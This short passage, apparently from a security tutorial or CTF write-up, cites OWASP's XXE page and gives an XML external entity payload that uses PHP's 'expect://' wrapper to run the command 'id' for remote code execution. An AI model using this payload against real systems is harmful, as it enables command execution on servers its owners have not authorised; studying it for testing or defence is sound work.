<https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing>

If fortune is on our side, and the PHP “expect” module is loaded, we can get RCE. Let’s modify the payload

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
  <user>`&xxe;`</user>
  <pass>`mypass`</pass>
</creds>
```
